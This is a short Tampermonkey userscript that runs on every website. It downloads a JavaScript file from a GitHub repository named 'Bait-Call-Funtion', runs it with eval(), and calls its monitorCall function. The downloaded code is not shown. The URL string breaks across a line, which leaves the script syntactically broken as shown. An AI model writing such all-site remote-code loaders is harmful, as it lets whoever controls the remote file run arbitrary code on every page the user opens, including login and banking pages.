// ==UserScript==
// @name         Main Script
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Fetch and call monitorCall function from another repository
// @author       Your Name
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // URL of the JavaScript file containing monitorCall function
    const scriptUrl = 'https://raw.githubusercontent.com/Khubaibjan/Bait-Call-Funtion/main/IDs
';

    fetch(scriptUrl)
        .then(response => {
            if (!response.ok) throw new Error('Network response was not ok');
            return response.text();
        })
        .then(code => {
            eval(code); // Evaluate the fetched script
            monitorCall(); // Call the monitorCall function
        })
        .catch(error => console.error('Error loading script:', error));
})();

